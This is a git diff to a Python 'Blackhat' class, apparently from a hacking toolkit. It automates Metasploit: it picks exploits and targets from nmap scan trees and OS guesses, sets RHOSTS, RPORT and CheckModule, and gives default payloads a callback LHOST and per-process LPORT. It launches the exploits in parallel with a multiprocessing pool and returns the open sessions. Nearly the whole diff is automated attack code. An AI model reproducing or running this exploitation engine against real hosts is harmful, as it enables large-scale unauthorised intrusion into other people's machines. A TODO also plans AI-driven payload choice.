@@ -2,7 +2,8 @@ from json_data_processing_script import *
 from metasploit_script import *
 import os
 import socket
-
+import multiprocessing
+import random
 
 class Blackhat:
     def __init__(self):
@@ -24,6 +25,11 @@ class Blackhat:
         self.current_targets_option_tree = None
         self.checkmodule_option_tree_per_exploit = None
         self.host_ip = None
+        self.lport_for_exploit_execution = 50000
+        self.id_storage_for_exploit_execution = []
+
+        ######################MULTIPROCESS INITIALIZER########################################################
+        # self.lock = multiprocessing.Lock()
 
     ####################SUB FUNCTION TO HANDLE CORRECTION AND OPTIMIZATION####################################
     #                ________
@@ -193,17 +199,20 @@ class Blackhat:
         if os != correlation:
             tmp.append(correlation)
         ###LOOK FOR THE OS AND MAKE THE TREE FOR THE SPECIFIC TARGET RELATED TO THE IP###
+        ###CHECK IF AUTO, GENERIC TARGET IS IN THE LIST###
         for exploit, targets_option in tree_targets_option.items():
             target_selected = []
             for target_name in targets_option:
-                for os_name in tmp:
-                    if os_name in target_name.lower():
-                        target_selected.append(target_name)
-            ###IF OS NONE RELATED TARGET, LOOK IF THERE IS 'AUTO' IN TARGET###
+                if 'automatic' in target_name.lower():
+                    target_selected.append(target_name)
+                if 'generic' in target_name.lower():
+                    target_selected.append(target_name)
+            ###IF NO AUTO MOD FOUND, LOOK FOR THE OS OF TARGET###
             if len(target_selected) == 0:
                 for target_name in targets_option:
-                    if 'auto' in target_name.lower():
-                        target_selected.append(target_name)
+                    for os_name in tmp:
+                        if os_name in target_name.lower():
+                            target_selected.append(target_name)
             ###IF NONE OF THE PREVIOUS METHOD WORKED, RETRIEVE ALL EXPLOIT###
             if len(target_selected) == 0:
                 target_selected = targets_option
@@ -226,7 +235,7 @@ class Blackhat:
     def get_targets_tree(self):
         '''
         Methode used to create the exploit tree
-        :return: nothing (the result is stored in self.tree_targets)
+        :return: nothing (the result is stored in self.targets_tree)
         '''
         ##########################################USE THE MSFCONSOLE TO RETRIEVE THE EXPLOIT###################
         print(
@@ -347,7 +356,7 @@ class Blackhat:
             print(
                 self.env.color_monitor.background_OKGREEN + "[*] Success in creating the json of the targets' tree" + self.env.color_monitor.background_ENDC)
         ##########################STORE INFORATIONS IN THE CLASS ITSELF#################################################
-        self.tree_targets = dict_of_targets
+        self.targets_tree = dict_of_targets
         #                       ug
         #                      b
         #                     g           bug
@@ -373,9 +382,13 @@ class Blackhat:
             str(self.json_monitor.datapath) + '/targets_tree.json') +
               self.env.color_monitor.background_ENDC)
         self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/targets_tree.json',
-                                                    self.tree_targets)
+                                                    self.targets_tree)
 
     def get_existence_ia_ressources_data(self):
+        '''
+        Method used to check if the ia ressources about previous training exist
+        :return:
+        '''
         if os.path.exists(
                 os.path.join(self.json_monitor.save_path_ia_data, self.json_monitor.save_ia_data_file)) is True:
             return True
@@ -383,6 +396,10 @@ class Blackhat:
             return False
 
     def get_host_ip(self):
+        '''
+        Method used to get the ip of the host
+        :return:
+        '''
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         self.host_ip = s.getsockname()[0]
@@ -398,10 +415,192 @@ class Blackhat:
     #                    888
     ######################################EXPLOITATION PROCESS################################################
 
+    def executor_agent_configuration_and_launch_exploit(self, ip, port_number, exploit, flag_ia_data_load=None):
+        '''
+        Executor agent created for multiprocessing in exploit execution
+        :param ip: ip of the target (string)
+        :param port_number: number of the port associated with the following exploit (string)
+        :param exploit: exploit (string)
+        :param flag_ia_data_load: flag which indicate if ia data is load (string)
+        :return:
+        '''
+        ###GENERAL VARIABLE###
+        flag_rport_default_value_changed = None
+        ###FOR LPORT, CHOOSE A NUMBER BETWEEN 1-10000, STORE IT, AND IF IT IS ALREADY STORED CHOOSE AN OTHER ONE###
+        id = random.randint(1, 10000) #choose an id
+        tmp_time_wait = random.randint(0, 3) #create different time wait (not too long in oder to not impact benchmark) whose goal is to reduce collision probability
+        while id in self.id_storage_for_exploit_execution :
+            id = random.randint(1, 10000)
+            time.sleep(tmp_time_wait)
+        self.id_storage_for_exploit_execution.append(id)
+        ######################
+        ###GET LOCK###
+        # self.lock.acquire()
+        ##############
+        ###RUN THE EXPLOIT PART 1###------------------------------------------------------------------ #
+        self.env.run_an_exploit(exploit)
+
+        try:
+            ###RETRIEVE THE REQUIRED MISSING OPTIONS###
+            for options in self.env.current_exploit.missing_required:
+                flag_check = None
+                if options.lower() == 'checkmodule':
+                    ###SET CHECKMODULE ACCORDING TO THE TREE OF CHECKMODULE EXPLOIT###
+                    flag_check = self.env.change_option_exploit('CheckModule',
+                                                                self.checkmodule_option_tree_per_exploit[
+                                                                    '/'.join(
+                                                                        self.env.current_exploit.fullname.split(
+                                                                            '/')[1:])], 'STR')
+                if options.lower() == 'rhosts':
+                    ###SET RHOSTS ACCORDING TO THE TARGET TREE###
+                    flag_check = self.env.change_option_exploit('RHOSTS', str(ip), 'STR')
+
+                if options.lower() == 'rhost':
+                    ###SET RHOST ACCORDING TO THE TARGET TREE###
+                    flag_check = self.env.change_option_exploit('RHOST', str(ip), 'STR')
+
+                if options.lower() == 'rport':
+                    ###SET RPORT ACCORDING TO THE TARGET TREE###
+                    flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
+                    flag_rport_default_value_changed = 1
+
+                elif flag_check is None:
+                    raise Exception("Can't configure correctly the exploit : unknown required option")
+        except Exception as e:
+            print(self.env.color_monitor.background_FAIL +
+                  '[x] Failed to configure exploit {} : {}'.format(str(exploit),
+                                                                   str(e)),
+                  self.env.color_monitor.background_ENDC)
+        # ------------------------------------END CONF EXPLOIT PART 1--------------------------------- #
+
+        # --------------------------------------BEGIN PAYLOAD CONF------------------------------------ #
+        if flag_ia_data_load is None:
+            try:
+                ###RETRIEVE THE DEFAULT PAYLOAD AND SELECT IT###
+                # remove the beginning 'exploit/'
+                self.env.run_a_payload(self.default_tree_payload_per_exploit[
+                                           str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))])
+                ###CONFIGURE IT###
+                self.env.change_option_payload('LHOST', str(self.host_ip), 'STR')
+                ###LOAD THE PORT ACCORDING TO THE CONF TO AVOID "UNBIND PROCESS ERROR"###
+                tmp_lport_for_exploit_execution = self.lport_for_exploit_execution + int(id)
+                self.env.change_option_payload('LPORT', str(tmp_lport_for_exploit_execution), 'INT')
+                # self.lock.release()
+            except Exception as e:
+                print(self.env.color_monitor.background_FAIL +
+                      '[x] Failed to configure payload for exploit {} : {}'.format(str(exploit),
+                                                                                   str(e)),
+                      self.env.color_monitor.background_ENDC)
+
+        else:
+            # TODO
+            '''
+            use IA weight data to determine payload
+            '''
+            a = None
+        # ----------------------------------------END PAYLOAD CONF------------------------------------ #
+
+        # --------------------------------TARGETS CONF (EXPLOIT CONF PART 2)-------------------------- #
+        ###RETRIEVE TARGETS LIST RELATED TO THE EXPLOIT AND THE OS OF THE VICTIM###
+        target_list = self.current_targets_option_tree[str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))]
+
+        for target in target_list:
+            try:
+                ###GET THE INDEX###
+                index = self.targets_option_tree_per_exploit[
+                    str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))].index(
+                    str(target))
+                ###################
+                self.env.current_exploit.target = index
+                ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
+                json_exploit, session = self.env.execute_exploit()
+                if json_exploit == -1:
+                    print(self.env.color_monitor.background_FAIL +
+                          '[x] Failed to launch exploit with target {}'.format(str(index)),
+                          self.env.color_monitor.background_ENDC)
+                else:
+                    try:
+                        print(self.env.color_monitor.background_HEADER +
+                              '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
+                                  str(exploit),
+                                  str(self.default_tree_payload_per_exploit[
+                                          str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))]),
+                                  str(target),
+                                  str(ip),
+                                  str(self.env.current_exploit.runoptions['RPORT'])
+                              ),
+                              self.env.color_monitor.background_ENDC)
+                    except Exception:
+                        print(self.env.color_monitor.background_HEADER +
+                              '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
+                                  str(exploit),
+                                  str(self.default_tree_payload_per_exploit[
+                                          str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))]),
+                                  str(target),
+                                  str(ip),
+                                  str(port_number)
+                              ),
+                              self.env.color_monitor.background_ENDC)
+                    break
+                # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
+
+                if flag_rport_default_value_changed is None and json_exploit == -1:
+                    ###CHANGE RPORT AND RETRY THE SAME PROCESS WITH TARGET OPTION, EXECPT IF RPORT DEFAULT IS RPORT TREE###
+                    try:
+                        if str(port_number) == str(self.env.current_exploit.runoptions['RPORT']):
+                            raise Exception("RPORT default and RPORT in the target tree are the same")
+                        #######################################################################################################
+                        #######CHANGE RPORT######
+                        flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
+                        #########################
+                        ###IF RPORT NOT CHANGEABLE###
+                        if flag_check is None:
+                            raise Exception("RPORT not changeable ")
+                    except Exception:
+                        raise Exception("RPORT not changeable")
+                    #############################
+                    ###DISPLAY INFO###
+                    print(
+                        self.env.color_monitor.background_OKCYAN + "[*] Trying to run exploit by changing RPORT : {}".format(
+                            str(port_number)))
+                    ##################
+                    for target in target_list:
+                        ###GET THE INDEX###
+                        index = self.targets_option_tree_per_exploit[
+                            str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))].index(
+                            str(target))
+                        ###################
+                        self.env.current_exploit.target = index
+                        ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
+                        json_exploit, session = self.env.execute_exploit()
+                        if json_exploit == -1:
+                            print(self.env.color_monitor.background_FAIL +
+                                  '[x] Failed to get session with exploit\'s target {}'.format(
+                                      str(index)),
+                                  self.env.color_monitor.background_ENDC)
+                        else:
+                            print(self.env.color_monitor.background_OKGREEN +
+                                  '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
+                                      str(exploit),
+                                      str(self.default_tree_payload_per_exploit[str(exploit)]),
+                                      str(target),
+                                      str(ip),
+                                      str(port_number)
+                                  ),
+                                  self.env.color_monitor.background_ENDC)
+                            break
+                    # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
+
+            except Exception as e:
+                print(self.env.color_monitor.background_FAIL +
+                      '[x] Failed to launch the exploitation : {}'.format(str(e)),
+                      self.env.color_monitor.background_ENDC)
+        # self.lock.release()
+
     def launch_exploitation(self, mode):
         ###GENERAL VARIABLE###
         flag_ia_data_load = None
-        flag_rport_default_value_changed = None
+        pool = multiprocessing.Pool(processes=10)  # 20 simultaneous process
         ######################
         if mode == "train":
             # TODO
@@ -435,7 +634,11 @@ class Blackhat:
                 self.targets_tree = self.json_monitor.read_json_data_in_a_file(
                     self.json_monitor.datapath + '/targets_tree.json')
             else:
-                raise Exception("No target tree were found, launch nmap module in Hacktool Box first")
+                print(
+                    self.env.color_monitor.background_WARNING + "[!!!] No target tree were found, creating it based on"
+                                                                " last nmap scan launched via HacktoolBox interfaces" +
+                    self.env.color_monitor.background_ENDC)
+                self.get_targets_tree()
             ###RETRIEVE THE PAYLOAD TREE IF ALREADY STORED###
             if self.default_tree_payload_per_exploit is None:
                 if os.path.exists(os.path.join(self.json_monitor.datapath, 'default_payload_tree.json')) is True:
@@ -480,151 +683,170 @@ class Blackhat:
                       self.env.color_monitor.background_ENDC)
                 self.env.color_monitor.print_exploit_banner()
                 ###RETRIEVE THE TARGETS OPTION TREE FOR AN IP###
-                self.current_targets_option_tree = self.json_monitor.read_json_data_in_a_file(
-                    self.json_monitor.datapath +
-                    '/targets_option_tree_for_' + str(ip) + '.json')
+                if os.path.exists(os.path.join(self.json_monitor.datapath,
+                                               'targets_option_tree_for_' + str(ip) + '.json')) is True:
+                    self.current_targets_option_tree = self.json_monitor.read_json_data_in_a_file(
+                        self.json_monitor.datapath +
+                        '/targets_option_tree_for_' + str(ip) + '.json')
+                else:
+                    print(self.env.color_monitor.background_WARNING +
+                          '[!!!] No targets option tree found for ip {}, creation of this feature is launched'.format(
+                              str(ip)) +
+                          self.env.color_monitor.background_ENDC)
+                    self.get_targets_option_for_target_per_exploit(str(ip))
 
                 ###EXPLORE THE TARGET TREE###
                 for port_number in [*self.targets_tree[ip]["ports"]]:
                     for exploit in self.targets_tree[ip]["ports"][port_number]["exploit"]:
-                        # ---------------------------------USEFULL VARIABLE FOR THE USE OF EXPLOIT ------------------- #
-                        name_exploit_for_use = str(exploit).split('/')
-                        name_exploit_for_use = '/'.join(name_exploit_for_use[1:])
-                        # ---------------------------------END USEFULL VARIABLE--------------------------------------- #
+                        pool.apply_async(self.executor_agent_configuration_and_launch_exploit,
+                                         args=(str(ip), str(port_number), exploit, flag_ia_data_load))
+                pool.close()
+                pool.join()
+                #         self.executor_agent_configuration_and_launch_exploit(str(ip), str(port_number), str(exploit),
+                #                                                      flag_ia_data_load)
+                # multiprocessing.Process(target=self.executor_agent_configuration_and_launch_exploit, args=(locker, str(ip), str(port_number), exploit, flag_ia_data_load)).start()
 
-                        ###RUN THE EXPLOIT PART 1###------------------------------------------------------------------ #
-                        self.env.run_an_exploit(exploit)
+                # for exploit in self.targets_tree[ip]["ports"][port_number]["exploit"]:
+                # # ---------------------------------USEFULL VARIABLE FOR THE USE OF EXPLOIT ------------------- #
+                # name_exploit_for_use = str(exploit).split('/')
+                # name_exploit_for_use = '/'.join(name_exploit_for_use[1:])
+                # # ---------------------------------END USEFULL VARIABLE--------------------------------------- #
 
-                        try:
-                            ###RETRIEVE THE REQUIRED MISSING OPTIONS###
-                            for options in self.env.current_exploit.missing_required:
-                                flag_check = None
-                                if options.lower() == 'checkmodule':
-                                    ###SET CHECKMODULE ACCORDING TO THE TREE OF CHECKMODULE EXPLOIT###
-                                    flag_check = self.env.change_option_exploit('CheckModule',
-                                                                                self.checkmodule_option_tree_per_exploit[
-                                                                                    name_exploit_for_use], 'STR')
-                                if options.lower() == 'rhosts':
-                                    ###SET RHOSTS ACCORDING TO THE TARGET TREE###
-                                    flag_check = self.env.change_option_exploit('RHOSTS', str(ip), 'STR')
-
-                                if options.lower() == 'rhost':
-                                    ###SET RHOST ACCORDING TO THE TARGET TREE###
-                                    flag_check = self.env.change_option_exploit('RHOST', str(ip), 'STR')
-
-                                if options.lower() == 'rport':
-                                    ###SET RPORT ACCORDING TO THE TARGET TREE###
-                                    flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'STR')
-                                    flag_rport_default_value_changed = 1
-
-                                elif flag_check is None:
-                                    raise Exception("Can't configure correctrly the exploit : unknown required option")
-                        except Exception as e:
-                            print(self.env.color_monitor.background_FAIL +
-                                  '[x] Failed to configure exploit {} : {}'.format(str(exploit),
-                                                                                   str(e)),
-                                  self.env.color_monitor.background_ENDC)
-                        # ------------------------------------END CONF EXPLOIT PART 1--------------------------------- #
-
-                        # --------------------------------------BEGIN PAYLOAD CONF------------------------------------ #
-                        if flag_ia_data_load is None:
-                            try:
-                                ###RETRIEVE THE DEFAULT PAYLOAD AND SELECT IT###
-                                # remove the beginning 'exploit/'
-                                self.env.run_a_payload(self.default_tree_payload_per_exploit[str(name_exploit_for_use)])
-                                ###CONFIGURE IT###
-                                self.env.change_option_payload('LHOST', str(self.host_ip), 'STR')
-                            except Exception as e:
-                                print(self.env.color_monitor.background_FAIL +
-                                      '[x] Failed to configure payload for exploit {} : {}'.format(str(exploit),
-                                                                                                   str(e)),
-                                      self.env.color_monitor.background_ENDC)
-
-                        else:
-                            # TODO
-                            '''
-                            use IA weight data to determine payload
-                            '''
-                            a = None
-                        # ----------------------------------------END PAYLOAD CONF------------------------------------ #
-
-                        # --------------------------------TARGETS CONF (EXPLOIT CONF PART 2)-------------------------- #
-                        ###RETRIEVE TARGETS LIST RELATED TO THE EXPLOIT AND THE OS OF THE VICTIM###
-                        target_list = self.current_targets_option_tree[str(name_exploit_for_use)]
-
-                        for target in target_list:
-                            try:
-                                ###GET THE INDEX###
-                                index = self.targets_option_tree_per_exploit[str(name_exploit_for_use)].index(
-                                    str(target))
-                                ###################
-                                self.env.current_exploit.target = index
-                                ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
-                                json_exploit, session = self.env.execute_exploit()
-                                if json_exploit == -1:
-                                    print(self.env.color_monitor.background_FAIL +
-                                          '[x] Failed to launch exploit with target {}'.format(str(index)),
-                                          self.env.color_monitor.background_ENDC)
-                                else:
-                                    print(self.env.color_monitor.background_HEADER +
-                                          '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
-                                              str(exploit),
-                                              str(self.default_tree_payload_per_exploit[str(name_exploit_for_use)]),
-                                              str(target),
-                                              str(ip),
-                                              str(self.env.current_exploit.runoptions['RPORT'])
-                                          ),
-                                          self.env.color_monitor.background_ENDC)
-                                    break
-                                # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
-
-                                if flag_rport_default_value_changed is None and json_exploit == -1:
-                                    ###CHANGE RPORT AND RETRY THE SAME PROCESS WITH TARGET OPTION, EXECPT IF RPORT DEFAULT IS RPORT TREE###
-                                    if str(port_number) == str(self.env.current_exploit.runoptions['RPORT']):
-                                        raise Exception("RPORT default and RPORT in the target tree are the same")
-                                    #######################################################################################################
-                                    #######CHANGE RPORT######
-                                    flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
-                                    #########################
-                                    ###IF RPORT NOT CHANGEABLE###
-                                    if flag_check is None:
-                                        raise Exception("RPORT not changeable ")
-                                    #############################
-                                    ###DISPLAY INFO###
-                                    print(
-                                        self.env.color_monitor.background_OKCYAN + "[*] Trying to run exploit by changing RPORT : {}".format(
-                                            str(port_number)))
-                                    ##################
-                                    for target in target_list:
-                                        ###GET THE INDEX###
-                                        index = self.targets_option_tree_per_exploit[str(name_exploit_for_use)].index(
-                                            str(target))
-                                        ###################
-                                        self.env.current_exploit.target = index
-                                        ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
-                                        json_exploit, session = self.env.execute_exploit()
-                                        if json_exploit == -1:
-                                            print(self.env.color_monitor.background_FAIL +
-                                                  '[x] Failed to get session with exploit\'s target {}'.format(
-                                                      str(index)),
-                                                  self.env.color_monitor.background_ENDC)
-                                        else:
-                                            print(self.env.color_monitor.background_OKGREEN +
-                                                  '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
-                                                      str(exploit),
-                                                      str(self.default_tree_payload_per_exploit[str(exploit)]),
-                                                      str(target),
-                                                      str(ip),
-                                                      str(port_number)
-                                                  ),
-                                                  self.env.color_monitor.background_ENDC)
-                                            break
-                                    # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
-
-                            except Exception as e:
-                                print(self.env.color_monitor.background_FAIL +
-                                      '[x] Failed to launch the exploitation : {}'.format(str(e)),
-                                      self.env.color_monitor.background_ENDC)
+                ############# self.executor_agent_configuration_and_launch_exploit(str(ip), str(port_number), str(exploit), flag_ia_data_load)
+                #
+                # ###RUN THE EXPLOIT PART 1###------------------------------------------------------------------ #
+                # self.env.run_an_exploit(exploit)
+                #
+                # try:
+                #     ###RETRIEVE THE REQUIRED MISSING OPTIONS###
+                #     for options in self.env.current_exploit.missing_required:
+                #         flag_check = None
+                #         if options.lower() == 'checkmodule':
+                #             ###SET CHECKMODULE ACCORDING TO THE TREE OF CHECKMODULE EXPLOIT###
+                #             flag_check = self.env.change_option_exploit('CheckModule',
+                #                                                         self.checkmodule_option_tree_per_exploit[
+                #                                                             name_exploit_for_use], 'STR')
+                #         if options.lower() == 'rhosts':
+                #             ###SET RHOSTS ACCORDING TO THE TARGET TREE###
+                #             flag_check = self.env.change_option_exploit('RHOSTS', str(ip), 'STR')
+                #
+                #         if options.lower() == 'rhost':
+                #             ###SET RHOST ACCORDING TO THE TARGET TREE###
+                #             flag_check = self.env.change_option_exploit('RHOST', str(ip), 'STR')
+                #
+                #         if options.lower() == 'rport':
+                #             ###SET RPORT ACCORDING TO THE TARGET TREE###
+                #             flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
+                #             flag_rport_default_value_changed = 1
+                #
+                #         elif flag_check is None:
+                #             raise Exception("Can't configure correctrly the exploit : unknown required option")
+                # except Exception as e:
+                #     print(self.env.color_monitor.background_FAIL +
+                #           '[x] Failed to configure exploit {} : {}'.format(str(exploit),
+                #                                                            str(e)),
+                #           self.env.color_monitor.background_ENDC)
+                # # ------------------------------------END CONF EXPLOIT PART 1--------------------------------- #
+                #
+                # # --------------------------------------BEGIN PAYLOAD CONF------------------------------------ #
+                # if flag_ia_data_load is None:
+                #     try:
+                #         ###RETRIEVE THE DEFAULT PAYLOAD AND SELECT IT###
+                #         # remove the beginning 'exploit/'
+                #         self.env.run_a_payload(self.default_tree_payload_per_exploit[str(name_exploit_for_use)])
+                #         ###CONFIGURE IT###
+                #         self.env.change_option_payload('LHOST', str(self.host_ip), 'STR')
+                #     except Exception as e:
+                #         print(self.env.color_monitor.background_FAIL +
+                #               '[x] Failed to configure payload for exploit {} : {}'.format(str(exploit),
+                #                                                                            str(e)),
+                #               self.env.color_monitor.background_ENDC)
+                #
+                # else:
+                #     # TODO
+                #     '''
+                #     use IA weight data to determine payload
+                #     '''
+                #     a = None
+                # # ----------------------------------------END PAYLOAD CONF------------------------------------ #
+                #
+                # # --------------------------------TARGETS CONF (EXPLOIT CONF PART 2)-------------------------- #
+                # ###RETRIEVE TARGETS LIST RELATED TO THE EXPLOIT AND THE OS OF THE VICTIM###
+                # target_list = self.current_targets_option_tree[str(name_exploit_for_use)]
+                #
+                # for target in target_list:
+                #     try:
+                #         ###GET THE INDEX###
+                #         index = self.targets_option_tree_per_exploit[str(name_exploit_for_use)].index(
+                #             str(target))
+                #         ###################
+                #         self.env.current_exploit.target = index
+                #         ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
+                #         json_exploit, session = self.env.execute_exploit()
+                #         if json_exploit == -1:
+                #             print(self.env.color_monitor.background_FAIL +
+                #                   '[x] Failed to launch exploit with target {}'.format(str(index)),
+                #                   self.env.color_monitor.background_ENDC)
+                #         else:
+                #             print(self.env.color_monitor.background_HEADER +
+                #                   '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
+                #                       str(exploit),
+                #                       str(self.default_tree_payload_per_exploit[str(name_exploit_for_use)]),
+                #                       str(target),
+                #                       str(ip),
+                #                       str(self.env.current_exploit.runoptions['RPORT'])
+                #                   ),
+                #                   self.env.color_monitor.background_ENDC)
+                #             break
+                #         # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
+                #
+                #         if flag_rport_default_value_changed is None and json_exploit == -1:
+                #             ###CHANGE RPORT AND RETRY THE SAME PROCESS WITH TARGET OPTION, EXECPT IF RPORT DEFAULT IS RPORT TREE###
+                #             if str(port_number) == str(self.env.current_exploit.runoptions['RPORT']):
+                #                 raise Exception("RPORT default and RPORT in the target tree are the same")
+                #             #######################################################################################################
+                #             #######CHANGE RPORT######
+                #             flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
+                #             #########################
+                #             ###IF RPORT NOT CHANGEABLE###
+                #             if flag_check is None:
+                #                 raise Exception("RPORT not changeable ")
+                #             #############################
+                #             ###DISPLAY INFO###
+                #             print(
+                #                 self.env.color_monitor.background_OKCYAN + "[*] Trying to run exploit by changing RPORT : {}".format(
+                #                     str(port_number)))
+                #             ##################
+                #             for target in target_list:
+                #                 ###GET THE INDEX###
+                #                 index = self.targets_option_tree_per_exploit[str(name_exploit_for_use)].index(
+                #                     str(target))
+                #                 ###################
+                #                 self.env.current_exploit.target = index
+                #                 ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
+                #                 json_exploit, session = self.env.execute_exploit()
+                #                 if json_exploit == -1:
+                #                     print(self.env.color_monitor.background_FAIL +
+                #                           '[x] Failed to get session with exploit\'s target {}'.format(
+                #                               str(index)),
+                #                           self.env.color_monitor.background_ENDC)
+                #                 else:
+                #                     print(self.env.color_monitor.background_OKGREEN +
+                #                           '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
+                #                               str(exploit),
+                #                               str(self.default_tree_payload_per_exploit[str(exploit)]),
+                #                               str(target),
+                #                               str(ip),
+                #                               str(port_number)
+                #                           ),
+                #                           self.env.color_monitor.background_ENDC)
+                #                     break
+                #             # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
+                #
+                #     except Exception as e:
+                #         print(self.env.color_monitor.background_FAIL +
+                #               '[x] Failed to launch the exploitation : {}'.format(str(e)),
+                #               self.env.color_monitor.background_ENDC)
 
         return self.env.client.sessions.list
 
@@ -637,6 +859,9 @@ if __name__ == '__main__':
     # foo.get_targets_option_for_target_per_exploit('172.16.1.2')
     # foo.get_default_checkmodule_per_exploit_tree()
     sessions_list = foo.launch_exploitation(mode='test')
-    print("-------------------------------------")
-    print(sessions_list)
-    print("-------------------------------------")
+    print(foo.env.color_monitor.background_OKGREEN+"-------------------------------------"+foo.env.color_monitor.background_ENDC)
+    print(foo.env.color_monitor.background_HEADER, sessions_list, foo.env.color_monitor.background_ENDC)
+    print(foo.env.color_monitor.background_OKGREEN+"-------------------------------------"+foo.env.color_monitor.background_ENDC)
+
+
+
